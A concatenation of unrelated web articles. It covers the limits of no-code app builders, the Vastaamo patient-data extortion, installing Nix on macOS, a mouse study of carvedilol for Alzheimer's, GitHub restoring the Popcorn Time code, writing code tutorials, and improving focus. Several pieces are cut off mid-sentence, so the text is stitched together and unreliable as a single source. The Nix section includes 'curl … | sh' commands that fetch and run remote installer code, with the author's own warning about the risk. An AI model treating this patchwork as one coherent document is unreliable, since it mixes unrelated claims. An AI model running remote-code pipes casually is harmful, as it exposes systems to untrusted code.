</p><p>Let’s say there is an app that people use a no-code tool today to build. If there are sufficient number of users that need this app, eventually, there will come a SAAS that will generalise what users need and offer a standard solution. Since they will dive deep into that specific problem, they will be able to put together features that no-code app builders would take a long time to build. Some might not even be possible.</p><p>I know some will go - “What is he even talking about? I have built so-and-so complicated software with x no-code tool”. Let me take a very specific example and show you what I mean. I have personally struggled with this one, so I know what I am talking about.</p><h2>An example</h2><p>Let’s say you have an app with a list of convenience stores. Whenever a user opens your app, you want to sort the list of stores in the increasing order of distance from the user’s current location. That’s it, no big deal. </p><p>You have a Google sheet with data that looks as below:</p><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fef5da496-a5df-467b-be5a-cd9b312e4a5d_624x89.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fef5da496-a5df-467b-be5a-cd9b312e4a5d_624x89.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/ef5da496-a5df-467b-be5a-cd9b312e4a5d_624x89.png&quot;,&quot;height&quot;:89,&quot;width&quot;:624,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:38478,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></p><p>The latitude and longitude for each store are in the Google maps link. Logically, what you need to do is the following - </p><ol><li><p>Extract the latitude longitude from each link.</p></li><li><p>Get user’s current location</p></li><li><p>Find distance between each store and user location. You can probably use Haversine formula here which should give good enough results.</p></li><li><p>Sort the list in the increasing order of distance found in step 3</p></li></ol><p>How do you accomplish this with a no-code tool? Let’s look at our options. </p><ol><li><p>Use an API? Okay, how do we write APIs? Code. Let’s say there is a tool to build APIs without code. How will you write the core sorting logic? Well, code.</p></li><li><p>Use Apps Script to sort the locations with respect to distance? What is Apps Script? Code.</p></li><li><p>Some no-code tools slip a coding paradigm of their own and call themselves no-code. That’s still code with the same problems and the same challenges as the other programming languages. So, code.</p></li></ol><p>Your only hope is if the tool provides this capability out-of-the-box. Even then, you will need to do some work to give it the data in just the right format that it needs.</p><p>Consider even a small modification to this problem. Let’s say you had to sort the list above with respect to a given fixed location that is available while the app is running, not the user’s location. This small tweak too can wreak havoc to a no-code solution. If the no-code tool expects you to specify the list to sort and the location to sort it by, you will be left wondering how to tell the tool to take user’s current location. If the tool takes user’s current location by default, you will be left wondering how to pass it your custom location.</p><p>This is a very small example. In a business that gets any kind of traction, eventually, flows get complex, validations get tricky and integrations get specific. You will see variants of the problem above, over and over again in different flavours. Sometimes, you will need to nudge people down paths that the tool doesn’t support, you will need to collect some data about the user experience that the tool doesn’t give you any visibility into and you will need to introduce business logic that the tool just wouldn’t give you any way to realise. These problems will just push the complexity on some other part of your application.</p><p> I have built full-fledged production apps on some of these tools and it makes me cry just to think about how much we had to change things on our side to play nice with the tool. The rigidity of the tool transferred all the responsibility on us to find a way to make a feature work on it. </p><p>I will talk more about very specific problems about the challenges I faced in future blog posts.

                    <p>The Finns were stunned this Friday at the outcome of a scandal caused by the <strong>extortion of a group of hackers</strong> to&nbsp;a private company that provides services as a psychotherapy center for the public health system.</p>

<p>In a country that claims to be at the forefront of digitization and data security, the criminals managed to access the database of thousands of customers of <strong>the company Vastaamo</strong> after detecting vulnerabilities in their system.</p>

<p>According to its website, Vastaamo offers psychological and psychiatric treatment to patients who suffer from disorders such as <strong>depression and anxiety</strong>.&nbsp;Many of the clients come from public services paid by the Finnish&nbsp;<strong>Social Security (Kela)</strong>.</p>

<p>Extortionists demanded around<strong> 450,000 euros (in bitcoins)</strong> in exchange for not publishing the clinical and mental health data of thousands of people.</p>

<p>The criminals started to publish <strong>the data of 100 people every day in the encrypted web Tor&nbsp;</strong>two days ago. They claimed they would not stop until&nbsp;they received the money.&nbsp;As the company was&nbsp;resisting to attend the demands of the hackers, personal data of over 200&nbsp;people - including minors - have been released online.</p>

<p>The information published could not be more sensitive: it included&nbsp;the patient's name, personal identification number, telephone number, email address and residence address, together <strong>with the content of the therapy sessions</strong>.</p>

<p>"An unknown hostile party has been in contact with Vastaamo and claims to have obtained confidential information from the company's customers.&nbsp;The Central Criminal Police launched a criminal investigation into the matter.&nbsp;Immediate notifications were also made to the Finnish Cyber ​​Security Center, Valvira and the Data Protection Commissioner.&nbsp;In addition, Vastamo took immediate steps to clarify the matter in cooperation with external and independent security experts," the company said in a press release.</p>

<h2>Rumours of ransom payment</h2>

<p>The data of <strong>another 100 people were published on Thursday </strong>night. But on Friday morning the page where the data was being released had been deleted, which triggered rumors about a possible payment to the extortionists.</p>

<p>At the time of writing this article, the company had&nbsp;neither confirmed nor denied the payment.&nbsp;<strong>Tuomas Kahri</strong>, Chairman of the Board of Vastaamo, told to the newspaper Ilta Sanomat that <strong>he would not comment on the ransom payment </strong>allegations.</p>

<p>The identity or nationality of the extortionists is unknown, and they appeared to not be worried about their possible arrest by the authorities.</p>

<p><strong>Ilta Sanomat </strong>exchanged several messages with them on Thursday, and according to the tabloid the criminals said they did not know that there was data of minors among the published information. However, they ensured that this would not stop their actions.</p>

<p>According to the same newspaper, the blackmailer had&nbsp;also offered individual patients the possibility of deleting their own data by <strong>paying about 540 euros in bitcoins</strong>.</p>

<h2>Police investigation</h2>

<p><strong>The National Bureau of Investigation (KRP)</strong> is investigating the attack as a case of gross breach and dissemination of private information. Police are asking people who have noticed their private information being disseminated to file an electronic crime report.</p>

<p>The company has been criticized for failing to notify customers earlier that their data was exposed in this extortion case. Some have complained they were contacted only after the case became known to the general public.</p>

October 25, 2020 | https://wickedchicken.github.io/post/macos-nix-setup/ | <a href="https://web.archive.org/web/*/https://wickedchicken.github.io/post/macos-nix-setup/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>I recently got a new Macbook, and began setting up the <a href="https://nixos.org/">Nix</a> package manager to
install my developer toolset. I mainly did this to try and have a working setup without
installing <a href="https://brew.sh/">Homebrew</a>. Since I ran into a few issues, I wanted to briefly
document what I did and why in case others wanted to try the same.</p>
<h3 id="why-nix-and-why-not-homebrew-or-macports">Why Nix? (and why not Homebrew or MacPorts?)</h3>
<p>The short answer: hype.</p>
<p>The long answer: I’ve been frustrated with Homebrew’s user experience for years now, and
used this opportunity to start afresh. The default non-Homebrew answer is the venerable
<a href="https://www.macports.org/">MacPorts</a>, which has been around for quite a while. Most people who aren’t
functional programming or build system nerds should probably use MacPorts, as it has been
around long enough to have good support documentation floating around the internet.
Unfortunately I’m a sucker for hermetic builds <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, so I decided to try
Nix.</p>
<p>In addition, Nix has one cool feature I haven’t seen anywhere else: temporarily installing
packages using <code>nix-shell</code>. For example, I can install <code>ripgrep</code> inside a temporary shell,
and the package is automatically cleaned up when I’m done:</p>
<p>There’s a lot of cool stuff <code>nix-shell</code> can do, check out some more examples
<a href="https://ghedam.at/15978/an-introduction-to-nix-shell">here</a>.</p>
<h4 id="why-not-homebrew">Why not Homebrew?</h4>
<p>If Homebrew works for you, then by all means keep using Homebrew! However, I’ve grown
frustrated with it. Homebrew has spent a lot of effort making a software delivery system
work across many iterations of OSX/MacOS, and countless developers have installed <code>brew</code>
as one of the first things on a new Mac. It is with this acknowledgement of the work the
Homebrew developers have put into the software and its resulting success that I offer
these criticisms:</p>
<ol>
<li>
<p>Unpredictable command times. I never know if running <code>brew install</code> or <code>brew upgrade</code>
is going to take 5 seconds or 20 minutes. This usually means knowing if a program or
dependency is being downloaded as a prebuilt binary or compiled on the spot. It would
be nice to signal to the user if compilation is about to happen, so they can plan the
install accordingly.</p>
</li>
<li>
<p>Very slow <code>brew update</code> times. Homebrew’s core package database is a
<a href="https://github.com/Homebrew/homebrew-core">git repository</a>, which is great for enabling collaboration. Nix uses
the <a href="https://github.com/NixOS/nixpkgs">same model</a>, but the difference lies in how the clients get the package
database: <code>brew update</code> does a <code>git pull</code> under the hood, while <code>nix-channel --update</code>
downloads a compressed tarball each time the channel is updated. This means Homebrew
updates can rely on git and GitHub itself as an efficient distribution mechanism,
getting delta updates “for free” without setting up extra infrastructure. However,
this design choice means that the client has to maintain its own git repo –
<a href="https://github.com/Homebrew/brew/issues/4755#issuecomment-416572560"><code>git gc</code> can strike at any time</a>, for example, and slow things down
tremendously. It is also a nightmare for <a href="https://discourse.brew.sh/t/best-practice-for-homebrew-on-travis-brew-update-is-5min-to-build-time/5215">CI</a>, where the lack of
an updated Homebrew git cache can negatively impact build times. Meanwhile,
<code>nix-channel --update</code> runs are very predictable, even if a bit inefficient – you’re
downloading a 16Mb tarball when the channel is updated, but that’s it.</p>
</li>
<li>
<p>Bad interactions when packages are upgraded. I’m not sure exactly why this happens, but
occasionally when certain packages are upgraded (such as <code>python</code> from 3.7 to 3.8),
<a href="https://discourse.brew.sh/t/homebrew-updating-major-python-version-breaks-a-lot-of-things-on-my-system/8545">related packages can break</a>. Because Nix builds are hermetic,
packages should all “work together” regardless of how the system was previously set
up.</p>
</li>
</ol>
<h4 id="why-not-macports">Why not MacPorts?</h4>
<p>To be honest, MacPorts is probably just fine for your needs. I haven’t used it in forever,
but my understanding is that it’s reliable and has plenty of built-up community knowledge
on how to fix things. Take a look at it and see if it fits your needs! I also quickly
found <a href="https://saagarjha.com/blog/2019/04/26/thoughts-on-macos-package-managers/">this post</a> which details some differences between it and
Homebrew. But hey, if you like adventure, give Nix a shot!</p>
<h4 id="why-not-nix">Why not Nix?</h4>
<p>I felt it was honest to include a section like this.</p>
<ol>
<li>
<p>I haven’t done a deep evaluation, but my impression is that Nix is the least documented
and least mature of the bunch. Expect to do a bit more digging to solve issues, but
once you get started it generally just works.</p>
</li>
<li>
<p>Workarounds are currently needed for Catalina and above, especially if you have an
older Mac without a T2 chip.</p>
</li>
<li>
<p>You’ll need to understand a bit of the <a href="https://nixos.wiki/wiki/Nix_Expression_Language">Nix Expression Language</a>. It’s
not as scary as it sounds, but you will have to edit a <code>.nix</code> file to install a
package (there is no CLI equivalent to <code>brew install</code> that I am aware of).</p>
</li>
</ol>
<h3 id="installing-nix">Installing Nix</h3>
<p>Installing Nix requires two phases: installing Nix itself, and then installing
<a href="https://github.com/LnL7/nix-darwin">nix-darwin</a>. The installation methods I know of involve <code>curl</code>ing with an
eventual <code>sudo</code> call inside the script<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. You will have to do something extra if
you’re running Catalina<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> or above.</p>
<ol>
<li>
<p>Install Nix:</p>
<ul>
<li>Pre-Catalina: <code>curl https://nixos.org/nix/install | sh</code> (I haven’t tested this).</li>
<li>Catalina with a T2 chip: <code>sh &lt;(curl -L https://nixos.org/nix/install) --darwin-use-unencrypted-nix-store-volume</code>
(according to the site, “unecrypted” is a misnomer as the chip will encrypt it
anyway).</li>
<li>Catalina without a T2 chip: follow <a href="https://www.philipp.haussleiter.de/2020/04/fixing-nix-setup-on-macos-catalina/">these instructions</a>
<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>.</li>
</ul>
<p>Make sure that <code>nix-build</code> is now in your <code>PATH</code>. You may have to source
<code>$HOME/.nix-profile/etc/profile.d/nix.sh</code> in your shell’s <code>rc</code> file to get this to
work.</p>
</li>
<li>
<p>Install <code>nix-darwin</code>:</p>
<div><pre><code data-lang="sh">nix-build https://github.com/LnL7/nix-darwin/archive/master.tar.gz -A installer ./result/bin/darwin-installer
</code></pre></div><p>You should now have <code>darwin-rebuild</code> in your <code>PATH</code>.</p>
</li>
</ol>
<h3 id="using-nix">Using Nix</h3>
<p>The basic workflow for using Nix is editing <code>~/.nixpkgs/darwin-configuration.nix</code> and then
running <code>darwin-rebuild switch</code> to activate those changes.</p>
<h4 id="editing-darwin-configurationnix">Editing <code>darwin-configuration.nix</code></h4>
<p>Open up <code>~/.nixpkgs/darwin-configuration.nix</code> with your favorite editor. Look at
<code>environment.systemPackages</code>: this is the list of packages you’ll want to install.
<a href="https://nixos.org/guides/nix-pills/basics-of-language.html#idm140737320584496">Nix lists</a> are space-delimited (not comma-delimited). The packages listed
there come from the Nixpkgs channel you’re subscribed to. You can list what packages are
available by running <code>nix-env -qaP</code> or searching <a href="https://search.nixos.org/packages">Nixpkgs</a> online. All the
packages are prepended with <code>pkgs.</code>; I used Nix’s <code>with pkgs;</code> clause to prepend that by
default:</p>
<div><pre><code data-lang="nix">  environment<span>.</span>systemPackages <span>=</span> <span>with</span> pkgs; [
      gitAndTools<span>.</span>gitFull
      byobu
      wget
    ];
</code></pre></div><h4 id="activating-your-changes">Activating your changes</h4>
<p>Once you’re done editing, run <code>darwin-rebuild switch</code> to install your new packages! If you
made an error, <code>darwin-rebuild</code> will let you know and your current environment will not be
affected.</p>
<h4 id="updating-the-package-database">Updating the package database</h4>
<p>If you want to update the package database, you can run</p>
<h4 id="advanced-usage">Advanced usage</h4>
<p>Nix will detect conflicts and error out, such as when two packages install the same
binary. This can happen when <code>python37</code> and <code>python38</code>, for example, both want to create a
binary called <code>pydoc3</code>. To resolve this, you can call <code>lowPrio</code> to declare a package low
priority and have the other package win.</p>
<div><pre><code data-lang="nix">  environment<span>.</span>systemPackages <span>=</span> <span>with</span> pkgs; [
      python37
      (lowPrio python38)
    ];
</code></pre></div><p>(As a side note: once you’ve installed both, look at how quickly you can uninstall and
reinstall each package. It takes between 1 and 2 seconds to uninstall or reinstall
python3.7, which in my opinion is ridiculously fast.)</p>
<h3 id="further-reading">Further reading</h3>
<p>I have to admit that I only have a shallow knowledge of Nix, and the information above
has made it sufficient as a daily replacement for Homebrew. However, there is a rich
ecosystem around Nix that you may want to explore further. Here are a few links to learn
more:</p>

<h3 id="good-luck-and-have-fun">Good luck and have fun!</h3>
<p>I hope this guide was helpful! Thanks to the Nix team for making such a cool package
manager. As I’m relatively new to Nix, feel free to contact me if there’s something I got
wrong or could have explained more clearly. Good luck and have fun with Nix!</p>

<li id="fn:1" role="doc-endnote">
<p>From the <a href="https://landing.google.com/sre/sre-book/chapters/release-engineering/">Google SRE book</a>: a build that is “insensitive to
the libraries and other software installed on the build machine.” This greatly
increases reliability, because it means that whatever you have installed on your
computer is less likely to affect the build process and the resulting program. This is
similar to <a href="https://www.docker.com/">Dockerizing</a> an application, but less extreme and less
resource-intensive to run. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>This is just as risky as the classic <a href="https://stackoverflow.com/questions/29382739/why-using-curl-sudo-sh-is-not-advised"><code>curl | sudo sh</code></a>.
Unfortunately I can’t find another way to easily install Nix, so I guess you can
download <a href="https://nixos.org/nix/install">https://nixos.org/nix/install</a> and <a href="https://nixos.org/guides/nix-pills/install-on-your-running-system.html#idm140737320801568">compare its signature</a> before
running it. <a href="#fnref:2" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:3" role="doc-endnote">
<p>Catalina gets a lot of shade for its read-only root filesystem and signed
binaries, but I think it’s a step forward for general purpose computing. What I object
to is that signed binaries must be signed with registered Apple developer accounts,
which cost money. It would be nice if that was a bit distributed, so anyone could sign
and Apple maintained a reputation database or something. I’m annoyed at Apple for
mixing good security and OS maintenance practices with total, walled-garden lockdown.
Admittedly, the web has a lot of the <a href="https://xkcd.com/1367/">same security benefits</a>, but we’re not at a
point yet where web apps can compete with native applications. Hopefully we’ll get
there one day. <a href="#fnref:3" role="doc-backlink">↩︎</a></p>

<li id="fn:4" role="doc-endnote">
<p>Thanks Philipp for figuring all this out and writing it down! <a href="#fnref:4" role="doc-backlink">↩︎</a></p>

                                                                                        <p><span><span>A research team at the University of Calgary’s <a href="https://cumming.ucalgary.ca/">Cumming School of Medicine</a> (CSM) led by Dr. S.R. Wayne Chen, PhD, has made an exciting breakthrough with the potential to prevent and reverse the effects of Alzheimer’s disease.</span></span></p>

<p><span><span>The team discovered that limiting the open time of a channel called the ryanodine receptor, which acts like a gateway to cells located in the heart and brain, reverses and prevents progression of Alzheimer’s disease in animal models. They also identified a drug that interrupts the disease process.</span></span></p>

<p><span><span>The effect of giving the drug to animal models was remarkable: After one month of treatment, the memory loss and cognitive impairments in these models disappeared. </span></span></p>

<p><span><span>“The significance of identifying a clinically used drug that acts on a defined target to provide anti-Alzheimer’s disease benefits can’t be overstated,” says Chen, a member of the <a href="https://libin.ucalgary.ca/">Libin Cardiovascular Institute</a> and the <a href="https://hbi.ucalgary.ca/">Hotchkiss Brain Institute</a> at the CSM.&nbsp;</span></span><span lang="EN-US"><span><span><span>Dr. Jinjing Yao, PhD, a student of Chen, is the first author of the study.</span></span></span></span></p>

<p><span><span>The results of this groundbreaking study were recently published in the peer-reviewed journal, <a href="https://www.cell.com/cell-reports/fulltext/S2211-1247(20)31158-X"><em>Cell Reports</em></a>.&nbsp;</span></span></p>

<p><span><span>This work is potentially highly impactful as more than half a million Canadians live with Alzheimer’s disease and other dementias, suffering memory loss and other cognitive impairments with a negative impact on quality of life. </span></span></p>

<h3><strong><span><span><span><span>The science behind the findings</span></span></span></span></strong></h3>

<p><span><span>Previous research has shown that the progression of Alzheimer’s disease is driven by a vicious cycle of the protein amyloid β (Aβ) inducing hyperactivity at the neuron level. However, the mechanism behind this wasn’t fully understood nor were there effective treatments to stop the cycle. &nbsp;</span></span></p>

<p><span><span>Chen’s team used a portion of an existing drug used for heart patients, carvedilol, to treat mice models with Alzheimer’s symptoms. After a month of treatment, researchers tested animal models with very promising results. </span></span></p>

<p><span><span>“We treated them for a month and the effect was quite amazing,” says Chen, explaining the drug was successful in reversing major symptoms of Alzheimer’s disease. “We couldn’t tell the drug-treated disease models and the healthy models apart.” </span></span></p>

<p><span><span>Chen, a Clarivate Highly Cited Researcher, is optimistic about the future of this research, noting the next step will be clinical trials in people.</span></span></p>

<p><em><span><span>Wayne Chen is a professor in the Department&nbsp;of Physiology and Pharmacology, Biochemistry and </span></span><span><span>Molecular Biology at the CSM.&nbsp;</span></span></em><span><span><em><span lang="EN-US"><span><span>Led by the&nbsp;</span></span></span></em><a href="http://www.hbi.ucalgary.ca/"><em><span><span><span><span><span>Hotchkiss Brain Institute</span></span></span></span></span></em></a><em><span lang="EN-US"><span><span>,&nbsp;</span></span></span></em><a href="http://www.ucalgary.ca/research/brain-and-mental-health"><em><span><span><span><span><span>Brain and Mental Health</span></span></span></span></span></em></a><em><span lang="EN-US"><span><span>&nbsp;is one of six research strategies guiding the University of Calgary toward its&nbsp;Eyes High&nbsp;goals.

			<p>For more than half a decade, Popcorn Time has been a thorn in the side of Hollywood. </p>
<p>The ‘Netflix for Pirates’ offers an easy-to-use application that opens the door to a library of thousands of streamable movies and TV-shows. </p>
<p>The Motion Picture Asociation (MPA) recognized this threat early on and pressured the original developers to throw in the towel. That worked, but it came too late as the open-source project was swiftly revived by others.</p>
<p>Today, Popcorn Time lives on through many project forks. The most popular is PopcornTime.app, which like its predecessor, <a href="https://github.com/popcorn-official" target="_blank">shares its source code publicly</a> on the developer hosting platform GitHub. This allows others to download, modify, and share it. </p>
<p>The MPA is not happy with this and took action recently. The movie industry group <a href="https://torrentfreak.com/mpa-suggests-github-could-be-held-liable-for-popcorn-times-copyright-infringements-200505/" target="_blank">informed GitHub</a>, which is owned by Microsoft, about the infringing nature of the software. According to the MPA, the application includes links to pirate sites, pirate APIs, and pirate torrent trackers, which are used to download pirated movies and TV-shows.</p>
<center><img src="https://torrentfreak.com/images/mparequest.jpg" alt="" width="500" height="354" srcset="https://passivetech.com/wp-content/uploads/2020/05/cd1cc7f20aa83c5321df90abe40fe86c.jpg 625w, https://torrentfreak.com/images/mparequest-600x424.jpg 600w" sizes="(max-width: 500px) 100vw, 500px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20500%20354'%3E%3C/svg%3E" data-lazy-srcset="https://passivetech.com/wp-content/uploads/2020/05/cd1cc7f20aa83c5321df90abe40fe86c.jpg 625w, https://torrentfreak.com/images/mparequest-600x424.jpg 600w" data-lazy-src="https://torrentfreak.com/images/mparequest.jpg"></center>
<p>On top of that, the MPA suggested that GitHub itself may be liable for copyright infringement if the company fails to take action. </p>
<p>While the MPA’s interpretation of the law is likely not shared by GitHub, the company did remove the Popcorn Time code. In most cases that would be the end of the story, but Popcorn Time was not backing off without a fight. </p>
<p>The developers submitted a DMCA counternotice explaining that the MPA’s request is not legitimate. The code is owned by Popcorn Time, not the MPA, and Popcorn Time asked GitHub to restore access. </p>
<p>“The code is 100 % ours and do not contain any copyright [sic] material please check again,” the <a href="https://github.com/github/dmca/blob/d7f4a6a3aade92999d4d86962972c4b27af820e3/2020/05/2020-05-04-MPA-counternotice.md" target="_blank">developer wrote</a>.</p>
<p>The app’s developers made a good point here. The identified code (not the built app) is not directly copyright infringing and it contains no direct links to copyright-infringing material either. This means that a DMCA notice may not be the right tool here.</p>
<p>Faced with both requests, GitHub has now decided to restore full access to the Popcorn Time repository. </p>
<p>This decision doesn’t necessarily mean that it agrees with the app developers, however. The DMCA simply prescribes that, following a counternotice, content can be restored after two weeks, unless the claiming party files a lawsuit. </p>
<center><img src="https://torrentfreak.com/images/popcorngit.jpg" alt="" width="590" height="451" srcset="https://passivetech.com/wp-content/uploads/2020/05/6bbe8d7f2ef64e3124e0ef0005129d46.jpg 1101w, https://torrentfreak.com/images/popcorngit-600x459.jpg 600w" sizes="(max-width: 590px) 100vw, 590px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20590%20451'%3E%3C/svg%3E" data-lazy-srcset="https://passivetech.com/wp-content/uploads/2020/05/6bbe8d7f2ef64e3124e0ef0005129d46.jpg 1101w, https://torrentfreak.com/images/popcorngit-600x459.jpg 600w" data-lazy-src="https://torrentfreak.com/images/popcorngit.jpg"></center>
<p>In this case, the MPA chose not to file a lawsuit against the Popcorn Time operators, so the code repositories are back online again. </p>
<p>Whether the MPA will follow-up with further action has yet to be seen. However, the whole episode highlights an interesting issue. There is little doubt that the Popcorn Time application is a pirate app. However, the code, as hosted by GitHub, is not infringing per se. As such, regular takedown notices don’t appear to work here.</p>

October 25, 2020 | https://swimm.io/blog/2020-07-27-creating-effective-and-sustainable-tutorials-for-your-dev-team/ | <a href="https://web.archive.org/web/*/https://swimm.io/blog/2020-07-27-creating-effective-and-sustainable-tutorials-for-your-dev-team/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-75e492e5="" data-v-61c0ab88=""><div><p>Creating tutorials for your codebase is not an intuitive task for many teams. How to tackle it? What makes for a good tutorial? How do we measure the effectiveness of a code tutorial correctly?</p>
<p>We covered dozens of tutorials and approaches at different companies and organisations, and here are the 5 elements we found every code tutorial has to have. We’re willing to go as far off and say: if your onboarding tutorials do not meet the following criteria - you probably shouldn’t bother creating them in the first place.</p>
<h2>What Makes a Code Tutorial Effective?</h2>
<p>While providing your engineers with code tutorials can be a time consuming task for everyone, tutorials pose some innate benefits that will help keep your onboarding programs effective and sustainable and internal knowledge sharing levelled up.</p>
<p><strong>Great code tutorials are:</strong></p>
<ol>
<li>Focused - highlighting just the part of the repo which your engineer needs to learn to get started. If the readers need to look through dozens of paragraphs to find what they were looking for, they might not even bother searching. In other words, tutorials are not like your history essay from high-school - You lose points for length and breadth.</li>
<li>Highlight the “Why”. They show a clear explanation of the logic behind the code and/or why it is like it is now.</li>
<li>They show a process rather than the mere solution. It’s much easier to understand code by seeing the process of its creation or the flow of information, rather than just looking at a freeze frame of what it looks like now.</li>
<li>Tinkering - they enable a sandbox experience or learning by doing. It’s similar to getting thrown a task from the backlog in the sense that it is hands on, however it is structured, and guided in a way that evokes deductively understanding codebase logic, and also does not require the time and investment a backlog task would.</li>
<li>Up to date. They have to be practical and up to date with the current code. What usually kills good tutorials is if they are outdated. Not only will they waste the reader’s time, they might cause actual damage by misleading. This is the number one reason that many engineers distrust tutorials, and documentation in general.</li>
</ol>
<h2>Recap</h2>
<p>Good tutorials are hard to make and maintain. Although, easier said than done, the key is to keep them updated, focused and encourage an independent learning process. The next step to tune-it up, would be to make sure we measure the effectiveness of our tutorials (more on that in a future post), and gather feedback to improve over time.</p>

       <p>Why can't we focus anymore? Why is it so difficult to focus on reading, studying, or thorough problem solving?</p>
       <p>Before we dive into the actionable part, here are some simple reasons why it's harder than ever to focus.</p>
       
       <h2>Why we can't focus</h2>
       <h4><strong>Reason #1: we process more information than ever.</strong></h4>
       <p>According to researchers from the University of California-San Diego, we consume through our phones, laptops, TVs and all other devices about&nbsp;<a target="_blank" href="https://ijoc.org/index.php/ijoc/article/viewFile/1566/743">34 GB of information per day.</a></p>
       <p>The researchers say this leads to an information overload that hampers our focus and leads to constant interruptions that prevent us from reflection and deeper thinking.</p>
       
       
       <h4><strong>Reason #2: filtering out information takes effort.</strong></h4>
       <p>Contrary to common sense,&nbsp;<strong>ignoring things is not a passive mental process.</strong></p>
       <p>Researchers have found that&nbsp;<strong>it takes energy to ignore irrelevant stimuli.</strong></p>
       <p>In the Distracted Mind, neuroscientist Adam Gazzaley writes:</p>
       <blockquote><p>What we learned from this experiment was that the act of ignoring is not a passive process; rather, the goal to ignore something is an active one that is mediated by the top-down suppression of activity below baseline levels of passively viewing.</p>
       <p><a target="_blank" href="https://www.ncbi.nlm.nih.gov/pubmed/15814009">(Source)</a></p>
       </blockquote>
       <p>It's not just about focusing better, but also about&nbsp;<em>ignoring better.</em></p>
       
       
       <h4><strong>Reason #3: we're being trained like mice by a variable-ratio reward schedule.</strong></h4>
       <p>Every like on social media, every notification, every email represents something&nbsp;<em>new!!!</em></p>
       <p><em>New</em>&nbsp;is exciting for us. Every such message releases the&nbsp;<a target="_blank" href="http://sitn.hms.harvard.edu/flash/2018/dopamine-smartphones-battle-time/">neurotransmitter dopamine</a>&nbsp;in our heads, making us feel good and adventurous.</p>
       <p><em>What if my crush sent me a message?</em><br>
       <em>What if I got that job?</em><br>
       <em>What if a friend wants to meet up and hang?</em></p>
       <p>Unlike in the past, now we carry with us devices that enable us to check if the above is true in about 3 seconds.</p>
       <p>How are we then supposed to do work which may require serious mental effort when we have dopamine-candy within our reach almost 24/7?</p>
       
       <p><strong>We process more information than ever, so filtering out the noise takes a lot of effort, and we're constantly being led astray from focus by dopamine-loaded interruptions. No wonder we can't focus.</strong></p>
       
       <h2>How to improve focus</h2>
       <p>Given that ignoring is an active process, we'll suggest ways to both ignore noise better and focus on the signal better.</p>
       <h3>Strategic focus vs task focus</h3>
       <p>Before we go any further, we'll split focus into 2 types:</p>
       <ul>
       <li><strong>1. Strategic focus</strong><br>
       Answering the question: What to focus on?</li>
       <li><strong>2. Task focus</strong><br>
       Answering the question: How do I focus on work?</li>

       </ul>
       
       <h3>1. How to improve strategic focus</h3>
       <p>Let's start with the obvious.</p>
       
       <h4>Define what you want to focus on</h4>
       <p>It's hard to focus on something if you don't know what it is.</p>
       <p>If you're looking into a heavy fog, there's nothing to focus on. Same goes for mental fog.</p>
       <p>While it's becoming popular to say "systems &gt; goals" or even "no goals" at all, we are goal-driven by nature.</p>
       <p>On a neural level, we filter information through our goals. Our perception of reality is to a large extent driven by goals.</p>
       <p>As neuroscientist Adam Gazzaley writes in the Distracted Mind:</p>
       <blockquote><p>... the inward flow of information is sculpted and pruned by goals in much the same way that our actions are, resulting in our perceptions being an interpretation of reality and not a veridical representation.</p>
       </blockquote>
       <p>In other words, when you're looking for Waldo, your mind activates neural circuits to find someone in a red-striped shirt and ignores almost all else.</p>
       <p>Your goal determines your perception of reality. You're more likely to spot information relevant to your goal than all other information out there.</p>
       <p>If you have a clear goal, it will be that much easier to spot the right information to help you achieve it and ignore the noise.</p>
       <p>Which brings us to this question:<br>
       <strong>What do you want to do?</strong></p>
       <p>Make a list.</p>
       <p>Once you have some sort of a list, it's not yet time to pursue all the items on it.</p>
       <p>It's time to prioritize and refine.</p>
       
       <h4>Define what&nbsp;<em>not</em>&nbsp;to focus on - use Warren Buffett's goal setting method</h4>
       <p>Once you have any kind of a list of things you'd like to accomplish, it's not yet time to pursue goals. That would be unfocused.</p>
       <p>Here's Warren Buffett's advice on goals:</p>
       <ol>
       <li>Write down the top 25 goals that you want to achieve in life.</li>
       <li>Select the 5 that matter the most.</li>
       <li>Forget the rest.</li>

       </ol>
       <p>Buffett highlights that pursuing all 25 will distract you. It will lead to a haphazard, unfocused approach that likely won't lead to results.</p>
       <p>The general principle of picking fewer goals than you think you want can be applied every day. It's a safeguard against the tendency to pick too many goals and diffuse your efforts.</p>
       
       <h4>Find 2 Wildly Important Goals<br>(and put them where you'll see them)</h4>
       <p>In 4 Disciplines of Execution, the authors recommend finding 2 wildly important goals (WIGs).</p>
       <p>WIGs are goals that are so important that if you achieve them, everything else will likely work out.</p>
       <p>They also recommend putting your goals into a specific format:<br>
       <strong>X to Y by when.</strong></p>
       <p>If you were to define the 2 Wildly Important Goals to focus on, what would they be?</p>
       <ul>
       <li>Get to $10 000 in revenue by July 1.</li>
       <li>Write 50 000 words by August 31st.</li>
       <li>...</li>

       </ul>
       <p><strong>Define your goals to have a clear target to focus on.</strong></p>
       <p>However, that's not enough. You can write down the goals and forget them. Completely.</p>
       <p>You need to be hyper-aware of those goals, so that they stay on your mind even through the daily turmoil of life.</p>
       <p>How to do that?</p>
       <p>How to focus on goals that matter despite the noise? </p>
       
